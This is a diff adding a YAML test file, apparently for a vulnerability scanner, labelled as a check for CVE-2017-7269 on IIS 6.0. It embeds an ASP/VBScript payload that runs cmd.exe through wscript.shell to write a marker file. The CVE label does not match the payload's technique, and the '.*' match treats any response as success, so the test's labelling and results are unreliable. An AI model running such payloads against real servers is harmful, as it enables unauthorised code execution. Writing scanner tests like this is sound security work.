@@ -1,0 +1,13 @@
+# tests/iis6_rce.yaml
+# Tests for CVE-2017-7269 on unpatched IIS 6.0 servers.
+# This payload attempts to create a file on the C: drive.
+# A successful test may not return a specific response, so the main
+# script logic should be updated to consider a 200 OK response as potentially successful.
+content: |
+  <%@ language="vbscript" %>
+  <%
+  On Error Resume Next
+  Set o = Server.CreateObject("wscript.shell")
+  o.run "cmd.exe /c echo DAVTEST-OK > C:\davtest_poc.txt", 0, true
+  %>
+execmatch: ".*"
